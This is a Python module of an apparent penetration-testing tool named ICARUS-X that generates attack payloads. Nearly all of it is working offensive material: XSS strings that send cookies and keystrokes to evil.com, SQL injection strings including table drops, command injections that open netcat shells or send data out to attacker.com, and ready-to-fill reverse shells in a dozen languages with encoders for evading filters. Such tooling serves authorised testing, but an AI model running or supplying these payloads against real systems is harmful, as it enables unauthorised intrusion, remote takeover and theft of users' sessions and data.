"""
ICARUS-X Payload Generator Module
==================================
Generate XSS, SQLi, Command Injection payloads and reverse shells.
"""

import base64
import urllib.parse
from dataclasses import dataclass
from typing import Optional

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()


@dataclass
class Payload:
    """Payload definition."""
    name: str
    payload: str
    category: str
    description: str
    encoded: dict = None


# ============================================================================
# XSS PAYLOADS
# ============================================================================

XSS_PAYLOADS = [
    Payload("Basic Alert", '<script>alert(1)</script>', "XSS", "Simple script injection"),
    Payload("IMG Onerror", '<img src=x onerror=alert(1)>', "XSS", "Image error handler"),
    Payload("SVG Onload", '<svg onload=alert(1)>', "XSS", "SVG onload event"),
    Payload("Body Onload", '<body onload=alert(1)>', "XSS", "Body onload event"),
    Payload("Event Handler", '<div onmouseover=alert(1)>hover</div>', "XSS", "Mouse event"),
    Payload("JavaScript URI", '<a href="javascript:alert(1)">click</a>', "XSS", "JavaScript URI"),
    Payload("Encoded Script", '<script>alert(String.fromCharCode(88,83,83))</script>', "XSS", "Char code encoding"),
    Payload("Template Literal", '${alert(1)}', "XSS", "ES6 template literal"),
    Payload("Fetch Exfil", '<script>fetch("https://evil.com?c="+document.cookie)</script>', "XSS", "Cookie exfiltration"),
    Payload("Polyglot", 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', "XSS", "Universal polyglot"),
    Payload("DOM XSS", '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', "XSS", "Base64 encoded eval"),
    Payload("No Parentheses", '<script>alert`1`</script>', "XSS", "Template literal call"),
    Payload("Cookie Stealer", '<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>', "XSS", "Image-based exfil"),
    Payload("Keylogger", '<script>document.onkeypress=function(e){new Image().src="https://evil.com/log?k="+e.key}</script>', "XSS", "Keystroke logger"),
]

# ============================================================================
# SQLi PAYLOADS
# ============================================================================

SQLI_PAYLOADS = [
    Payload("Basic OR", "' OR '1'='1", "SQLi", "Basic authentication bypass"),
    Payload("Comment Bypass", "' OR 1=1--", "SQLi", "Comment-based bypass"),
    Payload("Hash Comment", "' OR 1=1#", "SQLi", "MySQL hash comment"),
    Payload("UNION SELECT", "' UNION SELECT NULL,NULL,NULL--", "SQLi", "Union-based injection"),
    Payload("Time Delay", "'; WAITFOR DELAY '0:0:5'--", "SQLi", "MSSQL time-based"),
    Payload("MySQL Sleep", "' AND SLEEP(5)--", "SQLi", "MySQL time-based"),
    Payload("Stacked Query", "'; DROP TABLE users--", "SQLi", "Stacked query attack"),
    Payload("Error Based", "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "SQLi", "Error-based extraction"),
    Payload("Boolean Blind", "' AND 1=1--", "SQLi", "Boolean-based blind"),
    Payload("Extract Version", "' UNION SELECT @@version,NULL,NULL--", "SQLi", "Version extraction"),
    Payload("Extract User", "' UNION SELECT user(),NULL,NULL--", "SQLi", "Current user extraction"),
    Payload("Extract Tables", "' UNION SELECT table_name,NULL FROM information_schema.tables--", "SQLi", "Table enumeration"),
    Payload("Hex Bypass", "' OR 0x31=0x31--", "SQLi", "Hex encoding bypass"),
    Payload("Double URL Encode", "%2527%2520OR%25201%253D1--", "SQLi", "Double URL encoded"),
]

# ============================================================================
# COMMAND INJECTION PAYLOADS
# ============================================================================

CMDI_PAYLOADS = [
    Payload("Semicolon", "; id", "CMDi", "Command separator"),
    Payload("Pipe", "| id", "CMDi", "Pipe command"),
    Payload("AND", "& id", "CMDi", "Background command"),
    Payload("OR", "|| id", "CMDi", "OR operator"),
    Payload("Backticks", "`id`", "CMDi", "Command substitution"),
    Payload("Dollar Parens", "$(id)", "CMDi", "Modern substitution"),
    Payload("Newline", "%0aid", "CMDi", "Newline separator"),
    Payload("Reverse Shell nc", "; nc -e /bin/sh attacker.com 4444", "CMDi", "Netcat reverse shell"),
    Payload("Curl Exfil", "| curl http://attacker.com/$(whoami)", "CMDi", "Data exfiltration"),
    Payload("Sleep Test", "; sleep 5", "CMDi", "Time-based detection"),
    Payload("DNS Exfil", "| nslookup $(whoami).attacker.com", "CMDi", "DNS exfiltration"),
    Payload("Time with Ping", "; ping -c 5 127.0.0.1", "CMDi", "Ping delay test"),
]

# ============================================================================
# REVERSE SHELLS
# ============================================================================

REVERSE_SHELLS = {
    "bash": {
        "name": "Bash TCP",
        "payload": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "description": "Standard Bash reverse shell",
    },
    "bash_udp": {
        "name": "Bash UDP",
        "payload": 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
        "description": "Bash UDP reverse shell",
    },
    "python": {
        "name": "Python",
        "payload": '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
        "description": "Python reverse shell",
    },
    "python3": {
        "name": "Python3",
        "payload": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
        "description": "Python3 reverse shell",
    },
    "php": {
        "name": "PHP",
        "payload": '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        "description": "PHP reverse shell",
    },
    "perl": {
        "name": "Perl",
        "payload": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''',
        "description": "Perl reverse shell",
    },
    "ruby": {
        "name": "Ruby",
        "payload": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        "description": "Ruby reverse shell",
    },
    "nc": {
        "name": "Netcat Traditional",
        "payload": 'nc -e /bin/sh {ip} {port}',
        "description": "Netcat with -e flag",
    },
    "nc_mkfifo": {
        "name": "Netcat FIFO",
        "payload": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
        "description": "Netcat using mkfifo",
    },
    "powershell": {
        "name": "PowerShell",
        "payload": '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''',
        "description": "PowerShell reverse shell",
    },
    "java": {
        "name": "Java",
        "payload": '''r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor();''',
        "description": "Java reverse shell",
    },
    "socat": {
        "name": "Socat",
        "payload": 'socat tcp-connect:{ip}:{port} exec:/bin/sh,pty,stderr,setsid,sigint,sane',
        "description": "Socat reverse shell",
    },
    "awk": {
        "name": "AWK",
        "payload": '''awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''',
        "description": "AWK reverse shell",
    },
}


# ============================================================================
# ENCODING FUNCTIONS
# ============================================================================

def encode_base64(payload: str) -> str:
    """Base64 encode payload."""
    return base64.b64encode(payload.encode()).decode()


def encode_url(payload: str) -> str:
    """URL encode payload."""
    return urllib.parse.quote(payload)


def encode_double_url(payload: str) -> str:
    """Double URL encode payload."""
    return urllib.parse.quote(urllib.parse.quote(payload))


def encode_hex(payload: str) -> str:
    """Hex encode payload."""
    return ''.join(f'\\x{ord(c):02x}' for c in payload)


def encode_unicode(payload: str) -> str:
    """Unicode encode payload."""
    return ''.join(f'\\u{ord(c):04x}' for c in payload)


def encode_html_entities(payload: str) -> str:
    """HTML entity encode payload."""
    return ''.join(f'&#{ord(c)};' for c in payload)


ENCODERS = {
    "base64": encode_base64,
    "url": encode_url,
    "double_url": encode_double_url,
    "hex": encode_hex,
    "unicode": encode_unicode,
    "html": encode_html_entities,
}


# ============================================================================
# DISPLAY FUNCTIONS
# ============================================================================

def display_payloads(category: str = None):
    """Display available payloads."""
    console.print("\n[bold cyan]ICARUS-X Payload Generator[/bold cyan]\n")
    
    categories = {
        "xss": ("XSS Payloads", XSS_PAYLOADS),
        "sqli": ("SQLi Payloads", SQLI_PAYLOADS),
        "cmdi": ("Command Injection", CMDI_PAYLOADS),
    }
    
    for cat_key, (cat_name, payloads) in categories.items():
        if category and category.lower() != cat_key:
            continue
        
        table = Table(title=cat_name, show_header=True, header_style="bold cyan")
        table.add_column("#", style="dim", width=3)
        table.add_column("Name", style="yellow")
        table.add_column("Payload", style="green", max_width=50)
        table.add_column("Description", style="dim")
        
        for i, p in enumerate(payloads, 1):
            # Truncate long payloads
            payload_display = p.payload[:50] + "..." if len(p.payload) > 50 else p.payload
            table.add_row(str(i), p.name, payload_display, p.description)
        
        console.print(table)
        console.print()


def display_reverse_shells():
    """Display available reverse shells."""
    console.print("\n[bold cyan]Reverse Shell Generator[/bold cyan]\n")
    
    table = Table(show_header=True, header_style="bold cyan")
    table.add_column("Type", style="yellow")
    table.add_column("Name", style="white")
    table.add_column("Description", style="dim")
    
    for shell_type, shell_info in REVERSE_SHELLS.items():
        table.add_row(shell_type, shell_info["name"], shell_info["description"])
    
    console.print(table)
    console.print("\n[dim]Use: --type <type> --ip <your_ip> --port <port>[/dim]")


def generate_reverse_shell(shell_type: str, ip: str, port: int, encoder: str = None) -> str:
    """Generate a reverse shell payload."""
    if shell_type not in REVERSE_SHELLS:
        return f"Unknown shell type: {shell_type}"
    
    shell = REVERSE_SHELLS[shell_type]
    payload = shell["payload"].format(ip=ip, port=port)
    
    # Apply encoding if specified
    if encoder and encoder in ENCODERS:
        payload = ENCODERS[encoder](payload)
    
    return payload


def display_generated_shell(shell_type: str, ip: str, port: int, encoder: str = None):
    """Display a generated reverse shell."""
    payload = generate_reverse_shell(shell_type, ip, port)
    shell_info = REVERSE_SHELLS.get(shell_type, {})
    
    console.print(f"\n[bold cyan]{shell_info.get('name', shell_type)} Reverse Shell[/bold cyan]")
    console.print(f"[dim]Target: {ip}:{port}[/dim]\n")
    
    # Syntax highlighting based on shell type
    lang = "bash"
    if "python" in shell_type:
        lang = "python"
    elif "php" in shell_type:
        lang = "php"
    elif "powershell" in shell_type:
        lang = "powershell"
    elif "ruby" in shell_type:
        lang = "ruby"
    elif "perl" in shell_type:
        lang = "perl"
    
    console.print(Panel(
        Syntax(payload, lang, theme="monokai", word_wrap=True),
        title="Payload",
        border_style="green",
    ))
    
    # Show encoded versions
    if encoder:
        encoded = ENCODERS[encoder](payload)
        console.print(f"\n[bold yellow]{encoder.upper()} Encoded:[/bold yellow]")
        console.print(f"[dim]{encoded[:200]}...[/dim]" if len(encoded) > 200 else f"[dim]{encoded}[/dim]")
    
    # Listener command
    console.print(f"\n[bold magenta]Start listener:[/bold magenta]")
    console.print(f"  nc -lvnp {port}")
    

def get_payload_by_category(category: str, index: int = None, encoder: str = None) -> Optional[str]:
    """Get a specific payload by category and index."""
    payloads_map = {
        "xss": XSS_PAYLOADS,
        "sqli": SQLI_PAYLOADS,
        "cmdi": CMDI_PAYLOADS,
    }
    
    payloads = payloads_map.get(category.lower())
    if not payloads:
        return None
    
    if index is None:
        # Return all payloads
        result = []
        for p in payloads:
            encoded = p.payload
            if encoder and encoder in ENCODERS:
                encoded = ENCODERS[encoder](p.payload)
            result.append(f"# {p.name}\n{encoded}")
        return "\n\n".join(result)
    
    if 1 <= index <= len(payloads):
        payload = payloads[index - 1].payload
        if encoder and encoder in ENCODERS:
            payload = ENCODERS[encoder](payload)
        return payload
    
    return None


def display_encoders():
    """Display available encoders."""
    console.print("\n[bold cyan]Available Encoders[/bold cyan]\n")
    
    table = Table(show_header=True, header_style="bold cyan")
    table.add_column("Encoder", style="yellow")
    table.add_column("Example Output", style="dim")
    
    sample = "<script>alert(1)</script>"
    for name, encoder_fn in ENCODERS.items():
        encoded = encoder_fn(sample)[:50] + "..."
        table.add_row(name, encoded)
    
    console.print(table)
